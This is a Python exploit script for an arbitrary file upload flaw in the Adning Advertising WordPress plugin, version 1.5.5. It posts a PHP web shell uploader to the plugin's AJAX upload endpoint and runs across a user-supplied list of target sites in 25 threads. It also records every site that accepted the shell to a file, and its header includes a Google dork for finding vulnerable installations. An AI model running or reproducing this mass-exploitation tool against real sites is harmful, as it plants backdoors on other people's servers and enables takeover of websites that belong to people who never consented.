# Exploit Title: WordPress Plugin Adning Advertising 1.5.5 - Arbitrary File Upload
# Google Dork: inurl:/wp-content/plugins/angwp
# Date: 23/12/2020
# Exploit Author: spacehen
# Vendor Homepage: http://adning.com/
# Version: <1.5.6

import os.path
from os import path
import json, requests, sys
from colorama import Fore, init
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
init(autoreset=True)

Headers = {'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'}

Thread_ = '25' #Thread

def advertising(targetnya):
  if '://' in targetnya:
    pass
  else:
    targetnya = 'http://'+targetnya
  try:
    data = {'allowed_file_types' : 'php,jpg,jpeg', 'upload' : json.dumps({'dir' : '../'})}
    files = {'files[]':('Vuln.php', '<title>Vuln!! patch it Now!</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST["_upl"] == "Upload" ) {if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b>Shell Uploaded ! :)<b><br><br>"; }else { echo "<b>Not uploaded ! </b><br><br>"; }}?>')}
    response = requests.post(targetnya+'/wp-admin/admin-ajax.php?action=_ning_upload_image', files=files, data=data, headers=Headers, timeout=15).text
    if '"success":true' in response:
      print(Fore.WHITE+'['+Fore.YELLOW+'+'+Fore.WHITE+']'+targetnya+'/Vuln.php '+Fore.YELLOW+'SHELL UPLOADED!')
      open('SHELLs.txt', 'a').write(targetnya+'/Vuln.php'+'\n')
    else:
      print(Fore.WHITE+'['+Fore.RED+'-'+Fore.WHITE+']'+targetnya+Fore.RED+' NOT VULNERABLE')
  except:
    pass
  
logo = """
WordPress Plugin Adning Advertising 1.5.5 
  - Arbitrary File Upload
Coded By : KimiHmei7 [AzhariKun]
"""
print logo
targetnya = open(raw_input('input list:~# '),'r').read().split()
Thread = raw_input('Thread :~# ')
if targetnya:
  pool = ThreadPool(int(Thread_))
  pool.map(advertising, targetnya)
  pool.close()
  pool.join()
  